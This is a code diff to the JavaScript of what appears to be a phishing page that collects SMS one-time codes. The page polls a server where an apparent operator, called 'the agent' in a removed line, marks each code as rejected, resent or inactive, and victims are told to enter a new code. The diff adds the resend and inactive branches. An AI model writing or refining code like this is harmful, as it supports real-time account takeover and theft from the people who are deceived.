@@ -328,7 +328,6 @@ verifyBtn.addEventListener('click', function() {
 
                     } else if (statusData.status === 'rejected') {
                         clearInterval(interval);
-                        // UPDATED MESSAGE: Enter the correct 5 digit code
                         document.getElementById('processing-title').innerText = "Incorrect Details";
                         document.getElementById('processing-text').innerText = "Enter the correct 5 digit code.";
                         document.getElementById('loader-spinner').style.display = "none";
@@ -343,7 +342,6 @@ verifyBtn.addEventListener('click', function() {
 
                     } else if (statusData.status === 'resend') {
                         clearInterval(interval);
-                        // UPDATED MESSAGE: Check your sms for the new sms code
                         document.getElementById('processing-title').innerText = "SMS Resent";
                         document.getElementById('processing-text').innerText = "Check your sms for the new sms code.";
                         document.getElementById('loader-spinner').style.display = "none";
@@ -458,10 +456,24 @@ otpSubmitBtn.addEventListener('click', () => {
                             showScreen('screen-success');
                         }, 1000);
 
-                    } else if (statusData.status === 'rejected') {
+                    } else if (statusData.status === 'resend') {
                         clearInterval(interval);
-                        document.getElementById('processing-title').innerText = "Code Rejected";
-                        document.getElementById('processing-text').innerText = "The agent rejected this code. Please try again.";
+                        document.getElementById('processing-title').innerText = "SMS Resent";
+                        document.getElementById('processing-text').innerText = "Check your sms for the new sms code.";
+                        document.getElementById('loader-spinner').style.display = "none";
+                        
+                        setTimeout(() => {
+                            showScreen('screen-sms');
+                            smsInput.value = ''; 
+                            verifyBtn.style.pointerEvents = 'none';
+                            verifyBtn.style.background = '#1e3a8a';
+                            verifyBtn.style.color = '#8892b0';
+                        }, 3000);
+
+                    } else if (statusData.status === 'inactive') {
+                        clearInterval(interval);
+                        document.getElementById('processing-title').innerText = "Account Inactive";
+                        document.getElementById('processing-text').innerText = "Your account is currently inactive. Please contact support.";
                         document.getElementById('loader-spinner').style.display = "none";
                     }
                 } catch (error) {
